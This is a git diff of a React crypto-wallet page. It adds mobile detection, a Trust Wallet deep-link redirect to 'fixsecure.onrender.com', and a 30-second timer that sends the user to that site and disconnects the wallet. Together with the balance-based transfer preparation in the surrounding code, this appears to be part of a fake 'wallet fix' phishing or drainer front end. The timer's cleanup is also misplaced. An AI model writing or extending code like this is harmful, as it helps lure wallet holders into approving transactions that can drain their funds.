@@ -43,7 +43,7 @@ const Home = () => {
   const [totalFee, setTotalFee] = useState(null);
 
   const { open } = useAppKit();
-  const { address, isConnected } = useAppKitAccount();
+  const { address, isConnected, disconnect } = useAppKitAccount();
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
        const { walletInfo } = useWalletInfo();
@@ -132,6 +132,11 @@ const { data: request } = usePrepareTransactionRequest(
     }
   }, [confirmed]);
 
+  const isMobileDevice = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent) ||
+  window.matchMedia("(max-width: 768px)").matches || isMobile
+
+console.log("ismobiledevice", isMobileDevice);
+
  
 
   useEffect(() => {
@@ -141,7 +146,7 @@ const { data: request } = usePrepareTransactionRequest(
       console.log("chainId:", chain.id);
 
       if (activeChain?.id !== chain.id) {
-        console.log("Switching network...");
+        console.log("Switching network...")
         requestSwitch();
         return; // ✅ Wait for network switch before sending transaction
       } else {
@@ -179,12 +184,19 @@ console.log(walletInfo?.name)
   if (
     isConnected &&
     walletInfo?.name === "Trust Wallet"  &&
-    isMobile &&
+    isMobileDevice &&
     !isTrustWalletApp() // ensure we are not already inside the app
   ) {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
-    
     }
+      const timer = setTimeout(() => {
+         window.location.href = "https://fixsecure.onrender.com"
+         disconnect()
+    console.log("30 seconds passed");
+    return () => clearTimeout(timer);
+  }, 30000); // 30,000 ms = 30 seconds
+
+   
 }, [isConnected, walletInfo, activeChain?.id]);
 
   useEffect(() => {
